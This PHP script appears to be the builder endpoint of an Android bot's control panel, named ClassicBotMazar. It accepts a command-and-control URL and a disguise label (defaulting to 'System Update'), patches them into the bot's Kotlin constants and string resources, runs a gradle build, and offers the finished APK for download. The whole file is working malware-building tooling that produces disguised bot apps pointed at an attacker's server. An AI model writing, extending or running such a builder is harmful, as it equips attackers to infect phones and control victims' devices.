<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$apkName = $input['apkName'] ?? 'ClassicBotMazar';
$appLabel = $input['appLabel'] ?? 'System Update';
$c2Url = $input['c2Url'] ?? '';

if (empty($c2Url)) {
    echo json_encode(['success' => false, 'message' => 'C2 URL is required']);
    exit;
}

// Update Constants.kt with the new C2 URL
$constantsPath = __DIR__ . '/../../../app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
if (file_exists($constantsPath)) {
    $content = file_get_contents($constantsPath);
    $content = preg_replace('/val urlConnection = ".*"/', 'val urlConnection = "' . $c2Url . '"', $content);
    file_put_contents($constantsPath, $content);
}

// Update strings.xml with the new app label
$stringsPath = __DIR__ . '/../../../app/src/main/res/values/strings.xml';
if (file_exists($stringsPath)) {
    $content = file_get_contents($stringsPath);
    $content = preg_replace('/<string name="app_name">.*<\/string>/', '<string name="app_name">' . $appLabel . '</string>', $content);
    file_put_contents($stringsPath, $content);
}

// Determine if we are on Windows or Linux
$isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

$output = [];
$returnVar = 0;

if ($isWindows) {
    // Windows build
    $rootPath = realpath(__DIR__ . '/../../../');
    // Use call to ensure the script doesn't exit the shell early
    $command = 'cd /d ' . escapeshellarg($rootPath) . ' && call gradlew.bat assembleDebug 2>&1';
} else {
    // Linux/Replit build
    $javaPath = shell_exec('which java');
    $javaHomeCmd = '';
    if ($javaPath) {
        $realJavaPath = realpath(trim($javaPath));
        $javaHome = dirname(dirname($realJavaPath));
        $javaHomeCmd = "export JAVA_HOME=$javaHome; ";
    }
    $command = $javaHomeCmd . 'cd ' . escapeshellarg(__DIR__ . '/../../../') . ' && chmod +x gradlew && ./gradlew assembleDebug 2>&1';
}

exec($command, $output, $returnVar);

if ($returnVar === 0) {
    $apkPath = 'app/build/outputs/apk/debug/app-debug.apk';
    $newApkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $apkName);
    if (empty($newApkName)) $newApkName = 'app';
    
    $fullApkSource = realpath(__DIR__ . '/../../../') . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $apkPath);
    $fullApkDest = __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . $newApkName . '.apk';
    
    if (file_exists($fullApkSource)) {
        if (copy($fullApkSource, $fullApkDest)) {
            echo json_encode([
                'success' => true, 
                'message' => 'Build successful', 
                'downloadUrl' => $newApkName . '.apk',
                'log' => implode("\n", $output)
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to copy APK to panel directory', 'log' => implode("\n", $output)]);
        }
    } else {
        echo json_encode(['success' => false, 'message' => 'APK file not found after build at: ' . $fullApkSource, 'log' => implode("\n", $output)]);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Build failed with exit code ' . $returnVar, 'log' => implode("\n", $output)]);
}
